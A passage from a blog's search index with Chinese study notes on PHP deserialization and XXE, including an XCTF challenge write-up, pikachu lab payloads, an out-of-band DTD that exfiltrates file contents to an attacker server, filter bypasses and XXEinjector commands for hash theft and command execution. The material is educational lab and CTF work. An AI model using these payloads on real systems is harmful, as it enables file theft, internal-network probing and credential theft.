__sleep()     | 当调用`serialize()`函数时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这就允许对象在被序列化之前做任何清除操作 |\n| __wakeup()    | 反序列化恢复对象之前调用该方法.当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数 |\n| __invoke()    |             把一个实例对象当作函数使用时自动调用             |\n| __call()      |          当调用对象中不存在的方法会自动调用该方法。          |\n| __get()       |                在调用私有属性的时候会自动执行                |\n| __isset()     |          在不可访问的属性上调用isset()或empty()触发          |\n| __unset()     |             在不可访问的属性上使用unset()时触发              |\n\n**__wakeup() bypass**\n\n在需要对__wakeup() 进行绕过的时候，可以让序列化结果中类属性的数值大于其真正的数值进行绕过，这个方式适用于PHP < 5.6.25 和 PHP< 7.0.10\n\n```php\n<?php\nClass User{\n  public $name=\"Bob\";\n  \n  function __destruct(){\n    echo\"nameis Bob </br>\";\n  }\n  \n  function __wakeup(){\n    echo\"exit</br>\";\n  }\n}\n@var_dump(unserialize($_POST[\"u\"]));\n```\n\nPOST 参数O:4:\"User\":1:{s:4:\"name\";s:3:\"Bob\";}可以看到输出是：\n\n```php\nexit\n\nobject(User)[1]\n public 'name' => string 'Bob' (length=3)\n\nnameis Bob\n```\n\n如果在某些情况下，不想让__wakeup() 执行，可以将 \"User\"后的 2 改为一个比2 大的数字\n\nPOST 参数O:4:\"User\":2:{s:4:\"name\";s:3:\"Bob\";}：\n\n```mipsasm\nnameis Bob\n\nbooleanfalse\n```\n\n------\n\n**[XCTF]Web – Web_php_unserialize**\n\n题目源码：\n\n```php\n<?php \nclass Demo { \n    private $file = 'index.php';\n    public function __construct($file) {   #构造函数，对类的变量进行初始化\n        $this->file = $file; \n    }\n    function __destruct() { \n        echo @highlight_file($this->file, true); \n    }\n    function __wakeup() {  #魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法\n        if ($this->file != 'index.php') { \n            //the secret is in the fl4g.php\n            $this->file = 'index.php'; \n        } \n    } \n}\nif (isset($_GET['var'])) {         #存在$var                   \n    $var = base64_decode($_GET['var']);   #将$var base64解码并赋值$var\n    if (preg_match('/[oc]:\\d+:/i', $var)) { \n        die('stop hacking!'); \n    } else {\n        @unserialize($var); \n    } \n} else { \n    highlight_file(\"index.php\"); \n} \n?>\n```\n\n思路：主要是正则绕过和_wakeup（）绕过\n\n正则匹配：因为不能匹配`O:4`这种，我们可以`O:+4`绕过，因为在url编码中`+`会被转换为空格\n\n__wakeup()绕过：让序列化结果中类属性的数值大于其真正的数值进行绕过\n\n```php\n<?php\nclass Demo {\n    private $file = 'fl4g.php';\n}\n\n$a= new demo;\n$b=serialize($a);  //echo  O:4:\"Demo\":1:{s:10:\" Demo file\";s:8:\"fl4g.php\";}\n$b=str_replace('O:4', 'O:+4',$b);//绕过preg_match\n$b= str_replace(':1:', ':2:',$b);//绕过wakeup\necho base64_encode($b);     \n?>\n```\n\n得到\n\n> TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==\n\n再进行get传参即可\n\n### php序列化补充\n\n原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码\n执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行\n反序列化的时候就有可能会触发对象中的一些魔术方法。\n\n**serialize() //将一个对象转换成一个字符串**\n**unserialize() //将字符串还原成一个对象**\n\n触发：`unserialize `函数的变量可控，文件中存在可利用的类，类中有魔术方法：\n\n> 所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。\n\n```bash\n__call() \t\t\t//在对象上下文中调用不可访问的方法时触发\n__callStatic() //在静态上下文中调用不可访问的方法时触发\n__get() \t\t\t//用于从不可访问的属性读取数据\n__set() \t\t\t//用于将数据写入不可访问的属性\n__isset() \t\t//在不可访问的属性上调用 isset()或 empty()触发\n__unset() \t\t//在不可访问的属性上使用 unset()时触发\n__invoke() \t\t//当脚本尝试将对象调用为函数时触发\n```\n\n### 构造函数与析构函数\n\n- __construct()\n  具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。\n- __destruct()\n  析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。\n\n`new`出一个新的对象时就会调用__construct(),而对象被销毁时，例如程序退出时，就会调用__destruct()\n\n### 序列化细节\n\n#### 序列化含义\n\n例如：`O:4:\"user\":2:{s:3:\"age\";i:18;s:4:\"name\";s:3:\"LEO\";}`\n O代表对象；4代表对象名长度；2代表2个成员变量；其余参照如下\n\n|  类型   |                      结构                      |\n| :-----: | :--------------------------------------------: |\n| String  |                 s:size:value;                  |\n| Integer |                    i:value;                    |\n| Boolean |               b:value;(保存1或0)               |\n|  Null   |                       N;                       |\n|  Array  |                    a:size:                     |\n| Object  | O:strlen(object name):object name:object size: |\n\n#### public、protected、private下序列化对象的区别\n\nphp v7.x反序列化的时候对访问类别不敏感\n\n- public变量\n  直接变量名反序列化出来\n- protected变量\n  `\\x00 + * + \\x00 + 变量名`\n  可以用`S:5:\"\\00*\\00op\"`来代替`s:5:\"?*?op\"`\n- private变量\n  `\\x00 + 类名 + \\x00 + 变量名`\n\n## JAVA反序列化\n\n下方的特征可以作为序列化的标志参考:\n\n- 一段数据以`rO0AB`开头，你基本可以确定这串就是JAVA序列化base64加密的数据。\n\n- 或者如果以`aced`开头，那么他就是这一段java序列化的16进制\n","tags":["PHP","Java","unserialize"],"categories":["Web"]},{"title":"XML XXE漏洞","url":"/XML-XXE漏洞/","content":"\n# XML XXE漏洞\n\n## 基础概念\n\n### 1、xml基础概念\n\nXML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。\n\n### 2、XML与HTML的主要差异\n\nXML被设计为传输和存储数据，其焦点是数据的内容。\n\nHTML被设计用来显示数据，其焦点是数据的外观。\n\nHTML旨在显示信息，而XML旨在传输信息。\n\n### 3、xml示例\n\n```xml\n<!--文档类型定义-->\n<!DOCTYPE note [\t<!--定义此文档时note类型的文档-->\n<!ELEMENT note (to,from,heading,body)>\t<!--定义note元素有四个元素-->\n<!ELEMENT to (#PCDATA)>\t\t\t<!--定义to元素为\"#PCDATA\"类型-->\n<!ELEMENT from (#PCDATA)>\t\t<!--定义from元素为\"#PCDATA\"类型-->\n<!ELEMENT head (#PCDATA)>\t\t<!--定义head元素为\"#PCDATA\"类型-->\n<!ELEMENT body (#PCDATA)>\t\t<!--定义body元素为\"#PCDATA\"类型-->\n]]]>\n\n<!--文档元素-->\n<note>\n    <to>Dave</to>\n    <from>Tom</from>\n    <head>Reminder</head>\n    <body>You are a good man</body>\n</note>\n```\n\n## DTD\n\nDTD：Document Type Definition  即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。\n\nDTD一般认为有两种引用或声明方式：\n\n- 1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。\n- 2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。\n\nDTD实体有以下几种声明方式\n\n### 内部实体\n\n```xml\n<!DOCTYPE note [\n    <!ENTITY a \"admin\">\n]>\n<note>&a</note>\n<!-- admin -->\n```\n\n### 参数实体\n\n```xml\n<!DOCTYPE note> [\n    <!ENTITY % b \"<!ENTITY b1 \"awsl\">\">\n    %b;\n]>\n<note>&b1</note>\n<!-- awsl -->\n```\n\n- 参数实体用`% name`申明，引用时用`%name;`，只能在DTD中申明，DTD中引用。\n- 其余实体直接用`name`申明，引用时用`&name;`，只能在DTD中申明，可在xml文档中引用\n\n### 外部实体\n\n```xml\n<!DOCTYPE note> [\n    <!ENTITY c SYSTEM \"php://filter/read=convert.base64-encode/resource=flag.php\">\n]>\n<note>&c</note>\n<!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== -->\n```\n\n外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：\n\n![image-20230729103931875](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729103931875.png)\n\n上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有\n\n![image-20230805163325966](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230805163325966.png)\n\n### 靶场讲解 (pikachu xxe漏洞)\n\n![image-20230729102633777](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729102633777.png)\n\n1. 文件读取\n\n```xml\n<?xml version=\"1.0\"?> \n<!DOCTYPE foo [    \n<!ENTITY xxe SYSTEM \"file:///d:/test.txt\" > ]> \n<foo>&xxe;</foo>\n```\n\n![image-20230805163353148](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230805163353148.png)\n\n2. 内网探针或攻击内网应用（触发漏洞地址）\n\n```xml\n<?xml version = \"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTYTY rabbit SYSTEM \"http://192.168.1.4:80/index.txt\">\n]>\n<foo>&rabbit;</foo>\n```\n\n上面的ip地址假设就是内网的一台服务器的ip地址。还可以进行一个端口扫描，看一下端口是否开放。\n\n**无回显-读取文件**\n\n```xml-dtd\n<?xml version = \"1.0\"?>\n<!DOCTYPE test [\n\t\t<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=d:/test.txt\">\n\t\t<!ENTITY % dtd SYSTEM \"http://192.168.xx.xxx:80XX/test.dtd\">\n\t\t%dtd;\n\t\t%send;\n]>\n\n\ntest.dtd:\n<!ENTITY % payload\n\t\"<!ENTITY &#x25; send SYSTEM\n'http://192.168.xx.xxx:80xx/?data=%file;'>\"\n>\n%payload;\n```\n\n上面的url一般是自己的网站，通过第一步访问文件，然后再访问dtd文件，把读取到的数据赋给data，然后我们只需要再自己的网站日志，或者写个php脚本保存下来，就能看到读取到的文件数据了。\n\n## 绕过\n\n### ENTITY SYSTEM file等关键词被过滤\n\n使用编码方式绕过：UTF-16BE\n `cat payload.xml | iconv -f utf-8 -t utf-16be > payload.8-16be.xml`\n\n若http被过滤，可以\n\n### data://协议绕过\n\n```xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE test [\n    <!ENTITY % a \" <!ENTITY %  b SYSTEM 'http://118.25.14.40:8200/hack.dtd'> \"> \n    %a;\n    %b;\n]>\n<test>&hhh;</test>\n```\n\n### file://协议加文件上传\n\n```xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE test [\n    <!ENTITY % a SYSTEM \"file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg\">\n    %a;\n]>\n<!--上传文件-->\n<!ENTITY % b SYSTEM 'http://118.25.14.40:8200/hack.dtd'>\n```\n\n## php://filter协议加文件上传\n\n\n\n```xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE test [\n    <!ENTITY % a SYSTEM \"php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg\">\n    %a;\n]>\n    <test>\n        &hhh;\n    </test>\n\n<!--上传文件-->\n<!ENTITY hhh SYSTEM 'php://filter/read=convert.base64-encode/resource=./flag.php'>\n```\n\n\n\n```xml\n<?xml version=\"1.0\" ?>\n<!DOCTYPE test [\n    <!ENTITY % a SYSTEM \"php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg\">\n    %a;\n]>\n    <test>\n        &hhh;\n    </test>\n<!--上传文件-->\nPCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==\n```\n\n#  xxe工具\n\n​          XXEinjector本身提供了非常非常丰富的操作选项，所以大家在利用XXEinjector进行渗透测试之前，请自习了解这些配置选项，以最大限度地发挥XXEinjector的功能。当然了，由于XXEinjector是基于Ruby开发的，所以Ruby运行环境就是必须的了。这里建议在kali环境下运行。\n\n## 参数说明\n\n```bash\n--host     \t\t\t必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)\n--file      \t\t必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt)\n--path           必填项-是否需要枚举目录 – 枚举路径。(--path=/etc)\n--brute          必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt)\n--logger        \t记录输出结果。\n--rhost          远程主机IP或域名地址。(--rhost=192.168.0.3)\n--rport          远程主机的TCP端口信息。(--rport=8080)\n--phpfilter    \t在发送消息之前使用PHP过滤器对目标文件进行Base64编码。\n--netdoc     \t\t使用netdoc协议。(Java).\n--enumports   枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)\n--hashes       窃取运行当前应用程序用户的Windows哈希。\n--expect        使用PHP expect扩展执行任意系统命令。(--expect=ls)\n--upload       使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt)\n--xslt      \t\tXSLT注入测试。\n--ssl              使用SSL。\n--proxy         使用代理。(--proxy=127.0.0.1:8080)\n--httpport \t\tSet自定义HTTP端口。(--httpport=80)\n--ftpport       设置自定义FTP端口。(--ftpport=21)\n--gopherport  设置自定义gopher端口。(--gopherport=70)\n--jarport       设置自定义文件上传端口。(--jarport=1337)\n--xsltport  \t设置自定义用于XSLT注入测试的端口。(--xsltport=1337)\n--test     \t\t该模式可用于测试请求的有效。\n--urlencode     URL编码，默认为URI。\n--output       爆破攻击结果输出和日志信息。(--output=/tmp/out.txt)\n--timeout     设置接收文件/目录内容的Timeout。(--timeout=20)\n--contimeout  设置与服务器断开连接的，防止DoS出现。(--contimeout=20)\n--fast     \t\t跳过枚举询问，有可能出现结果假阳性。\n--verbose     显示verbose信息。\n```\n\n## 工具使用\n\n枚举HTTPS应用程序中的/etc目录：\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl\n```\n\n使用gopher（OOB方法）枚举/etc目录：\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher\n```\n\n二次漏洞利用：\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt\n```\n\n使用HTTP带外方法和netdoc协议对文件进行爆破攻击：\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc\n```\n\n通过直接性漏洞利用方式进行资源枚举：\n\n```bash\nruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK\n```\n\n枚举未过滤的端口：\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all\n```\n\n窃取Windows哈希：\n\n```bash\nruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes\n```\n\n使用Java jar上传文件：\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf\n```\n\n使用PHP expect执行系统指令：\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls\n```\n\n测试XSLT注入：\n\n```bash\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt\n```\n\n记录请求信息：\n\n```bash\nruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt\n```\n\n","tags":["XML","XXE"],"categories":["Web"]}]